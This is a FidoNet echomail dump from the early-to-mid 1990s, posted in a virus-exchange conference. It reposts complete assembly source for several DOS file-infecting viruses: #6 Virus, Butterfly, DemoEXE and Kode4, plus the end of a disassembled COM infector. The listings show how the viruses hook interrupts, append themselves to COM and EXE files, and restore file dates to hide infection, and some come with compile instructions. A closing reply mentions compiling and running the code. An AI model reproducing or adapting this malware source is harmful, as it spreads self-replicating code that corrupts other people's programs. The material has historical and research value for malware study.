  01AB B43E           mov    ah,3E     ; close file
  01AD CD21           int    21

  01AF EBB0           jmp    0161      ; jump to main file

;-------------------------------------------------
; move file pointer to the beginning of the file

  01B1 B000           mov    al,00
  01B3 EB06           jmp    01BB
  01B5 90             nop

;--------------------------------------
; move file pointer to the end of file

  01B6 B002           mov    al,02
  01B8 EB01           jmp    01BB
  01BA 90             nop

  01BB B442           mov    ah,42
  01BD 31C9           xor    cx,cx
  01BF 31D2           xor    dx,dx
  01C1 CD21           int    21

  01C3 C3             ret

;----------------------------------------------------
; find address of first byte of virus code in memory

  01C4 8BEC           mov    bp,sp
  01C6 8B7600         mov    si,[bp]
  01C9 81EE0301       sub    si,0103
  01CD C3             ret

;----------------
; working area

  01CE 2A 2E 43 4F 4D 00   ;  *.COM, 0
  01D4 E9 02 00    ; new first 3 bytes for victim
  01D7 EA F0 FF    ; oryginal first 3 byte of victim
  01DA 00 F0       ; buffer for last 2 bytes of inspected file
  01DC 57 57       ; virus sygnature WW

-+-  DinoMail v.1.0 Alpha
 + Origin: Hans' Point with DOSBoss West, Amsterdam (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/w-xxx,/w+xxx Disable (-) or enable (+) warning xxx

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 80 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17 
 To   : -  *.*  -                                                               
 Subj : NUMBER_6.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf605b
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Ron Toler, 2:283/718 (06 Nov 94 17:56)
* To   : Fred Lee
* Subj : NUMBER_6.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Ron.Toler@f718.n283.z2.fidonet.org
;*****************************************************************************
;   #6 Virus                                 *
;                                        *
;   Assembled with Tasm 2.5                          *
;   (c) 1992 Trident/Dark Helmet, The Netherlands                *
;                                        *
;       The author(s) take(s) no responsibility for any damaged caused by    *
;       this virus.                              *
;*****************************************************************************

        .RADIX  16
virus       SEGMENT
        MODEL   SMALL
        ASSUME  cs:virus, ds:virus, es:virus
        ORG 100h

len     EQU OFFSET last - begin

dummy:      DB  0e9h,02h,00h,86h,54h        ; Jump to start of
                            ; viruscode.
begin:      CALL    start               ; make a call to
                            ; push the IP on the
                            ; stack.
start:      POP bp              ; get the IP of the
                            ; stack.
        SUB     bp,108h             ; adjust BP (=IP)
                            ; for offset of DATA.

restore:    MOV di,0100h            ; copy the original
        LEA si,ds:[carrier_begin+bp]    ; host begin code back.
        MOV cx,05h
        REP     MOVSB

check:      MOV ah,0a0h             ; check if virus
        INT 21h             ; allready resident.
        CMP ax,8654h
        JE  end_virus

memory:     MOV ax,cs               ; DS = Memory Control
        DEC     ax              ; Blok (MCB).
        MOV ds,ax
        CMP     BYTE PTR ds:[0000],5ah      ; check first byte if
        JNE abort               ; last MCB.
        MOV ax,ds:[0003]            ; decrease memory size.
        SUB ax,40
        MOV ds:[0003],AX

        PUSH    cs              ; restore ds.
        POP ds

install:    MOV bx,ax               ; ES point where
        MOV ax,es               ; to copy virus in
        ADD ax,bx               ; memory.
        MOV es,ax

        MOV cx,len              ; copy virus to
        LEA si,ds:[begin+bp]        ; memory.
        LEA di,es:0105          ; offset = 105
        REP MOVSB
        MOV [virus_segment+bp],es       ; store virus_segment

        PUSH    cs              ; restore es
        POP es

hook_vectors:   CLI

        MOV ax,3521h            ; hook int 21h
        INT 21h
        MOV ds,[virus_segment+bp]
        MOV old_21h,bx
        MOV old_21h+2,es
        MOV dx,offset main_virus
        MOV ax,2521h
        INT 21h

        MOV ax,3512h            ; hook int 12h
        INT 21h
        MOV old_12h,bx
        MOV old_12h+2,es
        MOV dx,offset new_12h
        MOV ax,2512h
        INT 21h

        STI

abort:      MOV ax,cs               ; restore ds,es
        MOV ds,ax
        MOV es,ax

end_virus:  MOV bx,0100h            ; jump to begin host
        PUSH    bx
        XOR bx,bx
        XOR bp,bp
        XOR ax,ax
        XOR cx,cx
        RET

;*****************************************************************************
;                                        *
;   This part will intercept the interuptvectors and copy itself to      *
;   other host programs                          *
;                                        *
;*****************************************************************************

main_virus: PUSHF
        CMP ah,0a0h             ; check if virus calls
        JNE new_21h             ; and return id.
        MOV ax,8654h
        POPF
        IRET

new_21h:    PUSH    ds              ; new interupt 21
        PUSH    es              ; routine
        PUSH    di
        PUSH    si
        PUSH    ax
        PUSH    bx
        PUSH    cx
        PUSH    dx
        PUSH    sp
        PUSH    bp

check_open: CMP ah,3dh              ; check if a file is
        JNE check_exec          ; being opened
        JMP chk_com

check_exec: CMP ax,04b00h           ; check if a file is
        JNE     continu             ; executed
        JMP chk_com

continu:    POP bp
        POP sp
        POP dx              ; continu with
        POP cx              ; interrupt
        POP bx
        POP ax
        POP si
        POP di
        POP es
        POP ds
        POPF
        JMP DWORD PTR cs:[old_21h]

chk_com:    MOV cs:[name_seg],ds
        MOV cs:[name_off],dx
        CLD                 ; check if extension
        MOV di,dx               ; is COM file
        PUSH    ds
        POP es
        MOV al,'.'
        REPNE   SCASB
        CMP WORD PTR es:[di],'OC'
        JNE continu
        CMP WORD PTR es:[di+2],'M'
        JNE continu

        CMP WORD PTR es:[di-7],'MO'     ; Check for
        JNE error               ; COMMAND.COM
        CMP WORD PTR es:[di-5],'AM'
        JNE error
        CMP WORD PTR es:[di-3],'DN'
        JE  continu

error:      CALL    int24h              ; take care of error
                            ; messages
        CALL    set_atribute            ; set atribute for
                            ; writing

open_file:  MOV ds,cs:[name_seg]        ; open file
        MOV dx,cs:[name_off]
        MOV ax,3d02h
        CALL    do_int21h
        JC  close_file
        PUSH    cs
        POP ds
        MOV [handle],ax
        MOV bx,ax

        CALL    get_date

check_infect:   PUSH    CS              ; check if file
        POP DS              ; already infect
        MOV BX,[handle]
        MOV ah,3fh
        MOV cx,05h
        LEA dx,[carrier_begin]
        CALL    do_int21h
        MOV al, BYTE PTR [carrier_begin]+3  ; look for
        MOV ah, BYTE PTR [carrier_begin]+4  ; identification byte's
        CMP ax,[initials]
        JE  save_date

get_lenght: MOV ax,4200h
        CALL    move_pointer
        MOV ax,4202h
        CALL    move_pointer
        SUB AX,03h
        MOV [lenght_file],ax

        CALL    write_jmp           ; write jump
                            ; instruction.
        CALL    write_virus         ; write virus
                            ; body.

save_date:  PUSH    CS
        POP DS
        MOV bx,[handle]
        MOV dx,[date]
        MOV cx,[time]
        MOV ax,5701h
        CALL    do_int21h

close_file: MOV bx,[handle]         ; close file
        MOV ah,3eh
        CALL    do_int21h

restore_int24h: MOV dx,cs:[old_24h]         ; restore int24
        MOV ds,cs:[old_24h+2]       ; for critical
        MOV ax,2524h            ; error handling
        CALL    do_int21h

        JMP continu

new_24h:    MOV al,3
        IRET

new_12h:    JMP DWORD PTR cs:[old_12h]
        SUB ax,50
        IRET

;*****************************************************************************

move_pointer:   PUSH    cs
        POP ds
        MOV bx,[handle]
        XOR cx,cx
        XOR dx,dx
        CALL    do_int21h
        RET

do_int21h:  PUSHF
        CALL    DWORD PTR cs:[old_21h]
        RET

write_jmp:  PUSH    CS
        POP DS

        MOV ax,4200h            ; write jump
        CALL    move_pointer            ; instruction
        MOV ah,40h
        MOV cx,01h
        LEA dx,[jump]
        CALL    do_int21h

        MOV ah,40h              ; write offset of
        MOV cx,02h              ; jump
        LEA dx,[lenght_file]
        CALL    do_int21h

        MOV ah,40h              ; write mark for
        MOV cx,02h              ; infection
        LEA dx,[initials]
        CALL    do_int21h
        RET

write_virus:    PUSH    CS
        POP DS

        MOV ax,4202h            ; write main
        CALL    move_pointer            ; virus body
        MOV ah,40               ; at end of
        MOV cx,len              ; program
        MOV dx,105h
        CALL    do_int21h
        RET

get_date:   MOV ax,5700h
        CALL    do_int21h
        PUSH    cs
        POP ds
        MOV [date],dx
        MOV [time],cx
        RET

int24h:     MOV ax,3524h
        CALL    do_int21h
        MOV cs:[old_24h],bx
        MOV cs:[old_24h+2],es
        MOV dx,offset new_24h
        PUSH    CS
        POP DS
        MOV AX,2524h

 * Message split, to be continued *
-+-  GEcho 1.00
 + Origin: The PRO-Point on a PRO-BBS and a PRO-*.* ...Ciaro?... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/d            Warn if duplicate symbols in libraries

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 81 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17 
 To   : -  *.*  -                                                               
 Subj : [part 2] NUMBER_6.ASM                                                   
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf6061
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Ron Toler, 2:283/718 (06 Nov 94 17:56)
* To   : Fred Lee
* Subj : [part 2] NUMBER_6.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Ron.Toler@f718.n283.z2.fidonet.org
 * Continuation 1 of a split message *

        CALL    do_int21h
        RET

set_atribute:   MOV ax,4300h            ; get atribute
        MOV ds,cs:[name_seg]
        MOV dx,cs:[name_off]
        CALL    do_int21h

        AND cl,0feh             ; set atribute
        MOV ax,4301h
        CALL    do_int21h
        RET

;*****************************************************************************

text        db  '#6 Virus, Trident/The Netherlands 1992'
old_12h     dw  00h,00h
old_21h     dw  00h,00h
old_24h     dw  00h,00h
carrier_begin   db  090h,0cdh,020h,086h,054h
jump        db  0e9h
name_seg    dw  ?
name_off    dw  ?
virus_segment   dw  ?
handle      dw  ?
lenght_file dw  ?
date        dw  ?
time        dw  ?
initials    dw  5486h
last        db  090h

virus       ends
        end     dummy

-+-  GEcho 1.00
 + Origin: The PRO-Point on a PRO-BBS and a PRO-*.* ...Ciaro?... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/dSYM[=VAL]   Define symbol SYM = 0, or = value VAL

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 82 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17 
 To   : -  *.*  -                                                               
 Subj : BUTTRFLY.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf606b
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Hans Schotel, 2:283/718 (06 Nov 94 17:56)
* To   : Fred Lee
* Subj : BUTTRFLY.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Hans.Schotel@f718.n283.z2.fidonet.org
Comment|
************************************************************************
  Virus Name: Butterfly Virus
  Effective Length: 302 bytes
  Disassembled by Silent Death - 1993

  Notes:
        - Non-Resident .COM appender
        - infects up to 4 files in the current directory
        - infected files have 01h as the 4th byte
        - ok virus to learn off of but a lot of wasteful code

  To Compile: [Byte matchup!]
        TASM /m File.asm
        TLINK /t FILE.obj
************************************************************************|

        .model tiny
        .code
        org 100h

start:
        jmp     virus
        nop
        nop

oldjmp  db      0cdh                    ; int 20h
newjmp  db      20h
        db      90h                     ; nop
id      db      1                       ; infection marker

virus:
        call    delta                   ; get delta offset
delta:
        pop     bp
        sub     bp,10Bh                 ; adjust delta offset

        mov     di,100h                 ; move bytes to the start
        lea     si,[bp+oldjmp]          ; original starting
        mov     cx,4                    ; move four bytes
        cld                             ; clear direction flag
        rep     movsb                   ; move the bytes

        mov     ah,1Ah                  ; set dta
        lea     dx,[bp+dta]             ; set into heap
        int     21h

        mov     byte ptr [bp+offset counter],0 ; reset counter

        mov     ah,4Eh                  ; find first asciiz file
        lea     si,[bp+dta+1eh]         ; points to fname in dta
        lea     dx,[bp+fspec]           ; files to find (*.COM)
        push    dx                      ; save file spec
        jmp     short findfiles

returntohost:
        mov     ah,1Ah                  ; set dta
        mov     dx,80h                  ; to original position
        int     21h

        xor     ax,ax                   ; clear all registers
        xor     bx,bx                   ; no real need to
        xor     cx,cx
        xor     dx,dx
        xor     si,si
        xor     di,di
        mov     sp,0FFFEh               ; adjust stack pointer
        mov     bp,100h                 ; return to here
        push    bp
        xor     bp,bp                   ; clear this
        retn                            ; return to host

closeup:
        or      bx,bx                   ; is handle 0?
        jz      findnext                ; yup so don't bother closing

        mov     ch,0                    ; get attributes
        mov     cl,[bp+dta+15h]         ; theres no point!

        mov     ax,5701h                ; set files date/time
        mov     cx,word ptr [bp+dta+16h]; get original time
        mov     dx,word ptr [bp+dta+18h]; get original date
        int     21h

        mov     ah,3Eh                  ; close file
        int     21h
        xor     bx,bx                   ; delete handle

findnext:
        mov     ah,4Fh                  ; find next file

findfiles:
        pop     dx                      ; get filespec
        push    dx
        mov     cx,7                    ; all attributes
        xor     bx,bx                   ; make sure no handle
        int     21h

        jnc     infect                  ; jump if file found
        jmp     returntohost2           ; no files found then quit

vname   db      0FFh
        db      'Goddamn Butterflies'   ; YA Know!
        db      0FFh

infect:
        mov     dx,si                   ; dx => fname in dta

        mov     ax,3D02h                ; open file read/write
        int     21h
        jc      closeup                 ; if error close up, get another
        mov     bx,ax                   ; handle to bx

        mov     ah,3Fh                  ; read from file
        mov     cx,4                    ; four bytes
        lea     dx,[bp+oldjmp]          ; save here
        int     21h

        mov     ax,word ptr [bp+dta+23h]; get end of filename
        cmp     ax,444Eh                ; is file command.com?
        je      closeup                 ; yup so leave it

        cmp     [bp+id],1               ; is file infected?
        je      closeup                 ; yup so leave it

        mov     ax,word ptr [bp+dta+1ah]; get file size
        cmp     ax,121                  ; is file smaller than 121?
        jb      closeup                 ; if it is leave it

        mov     ax,4202h                ; file pointer to end
        cwd
        xor     cx,cx
        int     21h

        cmp     ax,64768                ; is file to big to infect
        ja      closeup                 ; if above then jump

        mov     [bp+data],ax            ; save file size

        lea     dx,[bp+oldjmp]          ; buffer to write from
        mov     cx,4                    ; 4 bytes
        mov     ah,40h                  ; write oldjmp to end of file
        int     21h

        lea     dx,[bp+virus]           ; start of virus
        mov     cx,12Ah                 ; write virus (298) to end
        mov     ah,40h                  ; write to file
        int     21h

        mov     ax,4200h                ; file pointer to start
        cwd
        xor     cx,cx
        int     21h

        mov     ax,[bp+data]            ; get the file size
        inc     ax                      ; increment the file size
        mov     word ptr [bp+newjmp],ax ; save the new jump
        mov     [bp+oldjmp],0E9h        ; new jump
        mov     [bp+id],1               ; infection marker

        lea     dx,[bp+oldjmp]          ; new jump
        mov     ah,40h                  ; write new start
        mov     cx,4                    ; four bytes
        int     21h

        inc     [bp+counter]
        cmp     [bp+counter],4          ; has 4 files been infected?
        jae     returntohost3           ; yup so return to host
        jmp     closeup                 ; close current file

returntohost2:                          ; This is a total waste!
        mov     di,100h                 ; start of file
        cmp     word ptr [di],20CDh     ; are we the original
        je      returntohost3           ; yup

returntohost3:
        jmp     returntohost

fspec   db      '*.COM',0               ; files to find

dta     db      43 dup (0)              ; holds dta
counter db      0                       ; holds file counter
data    dw      0                       ; holds new jump offset

        end     start

-+-  Concord/QWK O.O1 Beta-7
 + Origin: Data Fellows BBS (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/L            Specify library search paths

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 83 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17 
 To   : -  *.*  -                                                               
 Subj : DEMOEXE.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf6070
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Fred Lee, 2:283/718 (06 Nov 94 17:58)
* To   : Clif Jessop
* Subj : DEMOEXE.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Fred.Lee@f718.n283.z2.fidonet.org
  .model tiny                             ; Handy TASM directive
  .code                                   ; Virus code segment
            org 100h                      ; COM file starting IP
  ; Cheesy EXE infector
  ; Written by Dark Angel of PHALCON/SKISM
  ; For 40Hex Number 8 Volume 2 Issue 4
  id = 'DA'                               ; ID word for EXE infections

  startvirus:                             ; virus code starts here
            call next                     ; calculate delta offset
  next:     pop  bp                       ; bp = IP next
            sub  bp,offset next           ; bp = delta offset

            push ds
            push es
            push cs                       ; DS = CS
            pop  ds
            push cs                       ; ES = CS
            pop  es
            lea  si,[bp+jmpsave2]
            lea  di,[bp+jmpsave]
            movsw
            movsw
            movsw
            movsw

            mov  ah,1Ah                   ; Set new DTA
            lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
            int  21h

            lea  dx,[bp+exe_mask]
            mov  ah,4eh                   ; find first file
            mov  cx,7                     ; any attribute
  findfirstnext:
            int  21h                      ; DS:DX points to mask
            jc   done_infections          ; No mo files found

            mov  al,0h                    ; Open read only
            call open

            mov  ah,3fh                   ; Read file to buffer
            lea  dx,[bp+buffer]           ; @ DS:DX
            mov  cx,1Ah                   ; 1Ah bytes
            int  21h

            mov  ah,3eh                   ; Close file
            int  21h

  checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
            jnz  infect_exe
  find_next:
            mov  ah,4fh                   ; find next file
            jmp  short findfirstnext
  done_infections:
            mov  ah,1ah                   ; restore DTA to default
            mov  dx,80h                   ; DTA in PSP
            pop  es
            pop  ds                       ; DS->PSP
            int  21h
            mov  ax,es                    ; AX = PSP segment
            add  ax,10h                   ; Adjust for PSP
            add  word ptr cs:[si+jmpsave+2],ax
            add  ax,word ptr cs:[si+stacksave+2]
            cli                           ; Clear intrpts for stack manip.
            mov  sp,word ptr cs:[si+stacksave]
            mov  ss,ax
            sti
            db   0eah                     ; jmp ssss:oooo
  jmpsave             dd ?                ; Original CS:IP
  stacksave           dd ?                ; Original SS:SP
  jmpsave2            dd 0fff00000h       ; Needed for carrier file
  stacksave2          dd ?

  creator             db '[MPC]',0,'Dark Angel of PHALCON/SKISM',0
  virusname           db '[DemoEXE] for 40Hex',0

  infect_exe:
            les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
            mov  word ptr [bp+jmpsave2], ax
            mov  word ptr [bp+jmpsave2+2], es

            les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
            mov  word ptr [bp+stacksave2], es
            mov  word ptr [bp+stacksave2+2], ax

            mov  ax, word ptr [bp+buffer + 8] ; Get header size
            mov  cl, 4                        ; convert to bytes
            shl  ax, cl
            xchg ax, bx

            les  ax, [bp+offset newDTA+26]; Get file size
            mov  dx, es                   ; to DX:AX
            push ax
            push dx

            sub  ax, bx                   ; Subtract header size from
            sbb  dx, 0                    ; file size

            mov  cx, 10h                  ; Convert to segment:offset
            div  cx                       ; form

            mov  word ptr [bp+buffer+14h], dx ; New entry point
            mov  word ptr [bp+buffer+16h], ax

            mov  word ptr [bp+buffer+0Eh], ax ; and stack
            mov  word ptr [bp+buffer+10h], id

            pop  dx                       ; get file length
            pop  ax

            add  ax, heap-startvirus      ; add virus size
            adc  dx, 0

            mov  cl, 9                    ; 2**9 = 512
            push ax
            shr  ax, cl
            ror  dx, cl
            stc
            adc  dx, ax                   ; filesize in pages
            pop  ax
            and  ah, 1                    ; mod 512

            mov  word ptr [bp+buffer+4], dx ; new file size
            mov  word ptr [bp+buffer+2], ax

            push cs                       ; restore ES
            pop  es

            mov  cx, 1ah
  finishinfection:
            push cx                       ; Save # bytes to write
            xor  cx,cx                    ; Clear attributes
            call attributes               ; Set file attributes

            mov  al,2
            call open

            mov  ah,40h                   ; Write to file
            lea  dx,[bp+buffer]           ; Write from buffer
            pop  cx                       ; cx bytes
            int  21h

            mov  ax,4202h                 ; Move file pointer
            xor  cx,cx                    ; to end of file
            cwd                           ; xor dx,dx
            int  21h

            mov  ah,40h                   ; Concatenate virus
            lea  dx,[bp+startvirus]
            mov  cx,heap-startvirus       ; # bytes to write
            int  21h

            mov  ax,5701h                 ; Restore creation date/time
            mov  cx,word ptr [bp+newDTA+16h] ; time
            mov  dx,word ptr [bp+newDTA+18h] ; date
            int  21h

            mov  ah,3eh                   ; Close file
            int  21h

            mov ch,0
            mov cl,byte ptr [bp+newDTA+15h] ; Restore original
            call attributes                 ; attributes

  mo_infections: jmp find_next

  open:
            mov  ah,3dh
            lea  dx,[bp+newDTA+30]        ; filename in DTA
            int  21h
            xchg ax,bx
            ret

  attributes:
            mov  ax,4301h                 ; Set attributes to cx
            lea  dx,[bp+newDTA+30]        ; filename in DTA
            int  21h
            ret

  exe_mask            db '*.exe',0
  heap:                                   ; Variables not in code
  newDTA              db 42 dup (?)       ; Temporary DTA
  buffer              db 1ah dup (?)      ; read buffer
  endheap:                                ; End of virus

  end       startvirus

-+-  CrossPoint v3.02
 + Origin: Data Fellows BBS (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/i            Initialize all segments

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 84 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17 
 To   : -  *.*  -                                                               
 Subj : KOD4_399.ASM                                                            
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf6076
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Mark Hapershaw, 2:283/718 (06 Nov 94 17:58)
* To   : Mikko Hypponen
* Subj : KOD4_399.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Mark.Hapershaw@f718.n283.z2.fidonet.org
─────────═════════>>> Article From Evolution #2 - YAM '92

Article Title: Kode 4 v2 Virus
Author: Soltan Griss


seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h
V_Length        equ     vend-vstart
KODE4           proc    far
start           label   near
                db      0E9h,00h,00h


vstart          equ     $

                mov     si,100h                 ;get si to point to 100
                mov     di,102h                 ;get di to point to 102
lback:          inc     di                      ;increment di
                mov     ax,word ptr [si]        ;si is ponting to ax
                cmp     word ptr [di],ax        ;compare ax with di loc
                jne     lback                   ;INE go back and inc di


                mov     ax,word ptr [si+1]
                cmp     ax,word ptr [di+1]
                je      lout
                jmp     lback

lout:           add     di,3h                   ;jmp stored in the end
                sub     di,(v_length+100h)      ;+3 to get to end and -
                mov     si,di                   ;
;**********************************************************************
;*
;*  The above code can be re-written as follows...
;*  The above idea, although it works is very long in code....
;*  when DOS does a load and execute it pushes all registers the last
;*  register to be pushed contains the file length. so just subtract
;*  the current location
;**********************************************************************
;
;
;
;Host_Off:       pop     bp
;                sub     bp,offset host_off
;                mov     si,bp
;
;*** Before opening any file copy the original three bytes back to 100h
;*** Because they will get overwritten when you check any new files
                lea     di,temp_buff
                add     di,si
                mov     ax,word ptr [di]
                mov     cl,byte ptr [di+2]
                mov     di,100h
                mov     word ptr [di],ax
                mov     byte ptr [di+2],cl


                mov     ah,4Eh             ;Find first Com file
                mov     dx,offset filename  ; offset of "*.com"
                add     dx,si
                int     21h
                jnc     back
                jmp     done
Back:
                mov     ah,43h              ;get rid of read only
                mov     al,0
                mov     dx,9eh
                int     21h
                mov     ah,43h
                mov     al,01
                and     cx,11111110b
                int     21h

                mov     ax,3D02h           ;Open file for read/writing
                mov     dx,9Eh             ;get file name from file DTA
                int     21h
                jnc     next
                jmp     done
next:           mov     bx,ax               ;save handle in bx
                mov     ah,57h              ;get time date
                mov     al,0
                int     21h

                push    cx                  ;put in stack for later
                push    dx

                mov     ax,4200h        ; Move ptr to start of file
                xor     cx,cx
                xor     dx,dx
                int     21h


                mov     ah,3fh                ;load first 3 bytes
                mov     cx,3

                mov     dx,offset temp_buff
                add     dx,si
                int     21h

                xor     cx,cx       ;move file pointer to end of file
                xor     dx,dx
                mov     ax,4202h
                int     21h
                sub     ax,3                    ; Fix for real location
                push    ax
              ; nop                             ;
              ; nop                             ; used for debugging
              ; nop                             ;
              ; nop                             ;
              ; nop

                mov     di,offset temp_buff
                add     di,si
                mov     word ptr [j_code2+si],ax; Save two bytes in a
                                                ; word [jumpin]

                cmp     byte ptr [di],0e9h  ;look for a jmp at begining
                jne     infect

                mov     cx,word ptr [di+1]  ;check for XXX bytes at end
                pop     ax
                sub     ax,v_length
                cmp     ax, cx              ; jump (id string to check)
                jne     infect
                jmp     finish



infect:

                xor     cx,cx           ;move file pointer to begining
                xor     dx,dx           ;to write jump
                mov     ax,4200h
                int     21h

                mov     ah,40h           ;write jump in first 3 bytes
                mov     cx,3
                mov     dx, offset j_code1
                add     dx,si
                int     21h

                xor     cx,cx       ;move file pointer to end of file
                xor     dx,dx
                mov     ax, 4202h
                int     21h

                mov     dx,offset vstart
                add     dx,si            ;Start writing at top of virus
                mov     cx,(vend-vstart)   ; Set for length of virus
                mov     ah,40h             ;Write Data into the file
                int     21h


Finish:         pop     dx                 ;Restore old dates and times
                pop     cx
                mov     ah,57h
                mov     al,01h
                int     21h

                mov     ah,3Eh             ;Close the file
                int     21h

                mov     ah,4Fh             ;Find Next file
                int     21h
                jc      done
                jmp     back

done:
                mov     bp,100h
                jmp     bp


filename        db      "*.com",0
DATA            db      " -=+ Kode4 +=-, The one and ONLY!$"

j_code1         db      0e9h
j_code2         db      00h,00h
temp_buff       db      0cdh,020h,090h  ; CD 20 NOP
kode4           endp

vend            equ     $

seg_a           ends

                end     start

-+-  WM v2.09/91-0245
 + Origin: The PRO-Point on a PRO-BBS and a PRO-*.* ...Ciaro?... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/3            Enable 32-bit processing

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 85 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:17 
 To   : -  *.*  -                                                               
 Subj : RECENT POSTINGS                                                         
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf607f
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Brad Frazee, 1:132/189 (05 Nov 94 22:41)
* To   : Mark Larry
* Subj : RECENT POSTINGS
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f801.n280!f24.n24!f
1.n396!f1.n280!f777.n132!f184.n132!f189.n132!not-for-mail
Hi, Mark!

ML> I copied all the sources codes i have to my hard drive and
ML> floppies for future referance and to compile and run on my system.

